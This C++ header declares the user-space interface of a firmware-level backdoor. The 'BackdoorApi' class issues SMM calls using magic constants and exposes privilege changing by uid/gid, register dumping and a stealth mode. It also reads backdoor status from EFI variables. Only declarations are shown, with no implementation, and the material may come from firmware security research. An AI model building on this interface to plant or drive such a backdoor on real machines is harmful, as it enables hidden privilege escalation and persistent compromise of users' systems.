#ifndef __API_HPP__
#define __API_HPP__

#include <cstdint>
#include <utility>
#include <string>

class BackdoorApi {
public:
    BackdoorApi();

    void hello_world_test() const;
    std::size_t get_current_cpu() const;
    std::size_t change_priv(std::uint32_t uid, std::uint32_t gid) const;
    std::pair<std::size_t, std::size_t> dump_register(std::size_t id) const;
    void set_stealth_mode(bool set) const;
    void wakeup();
    std::pair<std::string, std::string> get_status() const;

private:
    bool needs_wakeup = false;

    struct Params {
        std::uint64_t r[6];
    };

    void smm_call(Params& params) const;

    static void switch_to_cpu(std::size_t cpu);
    static std::string read_efivar(const char* path);
    static void do_wakeup();

    enum class Function : std::size_t {
        GetCurrentCpu = 0x02,
        ChangePriv = 0x03,
        DumpReg = 0x04,
        SetStealthMode = 0x05,
        HelloWorldTest = 0x10
    };

    static constexpr const std::size_t BACKDOOR_MAGIC1 = 0x4141414141414141;
    static constexpr const std::size_t BACKDOOR_MAGIC2 = 0x4242424242424242;

    static constexpr const char* WAKEUP_EFIVAR_PATH = "/sys/firmware/efi/efivars/SmmBackdoorWakeup-5e888aef-7780-716c-b245-eb8f648a746c";
    static constexpr const char* STATUS_SMM_EFIVAR_PATH = "/sys/firmware/efi/efivars/SmmBackdoor-5e888aef-7780-5f5b-b245-eb8f648a746c";
    static constexpr const char* STATUS_DXE_EFIVAR_PATH = "/sys/firmware/efi/efivars/DxeBackdoor-5e888aef-7780-4e4a-b245-eb8f648a746c";
};

#endif
